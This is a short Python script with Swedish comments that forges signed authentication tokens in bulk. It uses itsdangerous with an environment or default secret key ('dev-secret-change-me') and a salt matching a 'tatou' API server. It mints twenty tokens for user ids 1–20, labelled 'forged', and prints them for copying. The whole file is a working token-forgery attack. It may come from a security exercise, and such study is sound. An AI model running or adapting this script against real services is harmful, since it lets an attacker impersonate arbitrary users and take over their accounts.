# forge_tokens_bulk.py
from itsdangerous import URLSafeTimedSerializer
import os, json

SECRET_KEY = os.environ.get("SECRET_KEY", "dev-secret-change-me")
SALT = "tatou-auth"  # måste matcha din servers _serializer() salt
NUM = 20  # antal tokens att generera

s = URLSafeTimedSerializer(SECRET_KEY, salt=SALT)

tokens = []
for i in range(1, NUM+1):
    payload = {
        "uid": i,
        "login": f"Mr_important{i}",
        "email": f"important{i}@proton.me",
        "iss": "tatou-api",
        "kv": 1,
        "jti": f"forged-{i:03d}"
    }
    token = s.dumps(payload)
    tokens.append((payload, token))

# Skriv ut smidigt för kopiering
print(json.dumps([{"payload": p, "token": t} for p,t in tokens], indent=2))

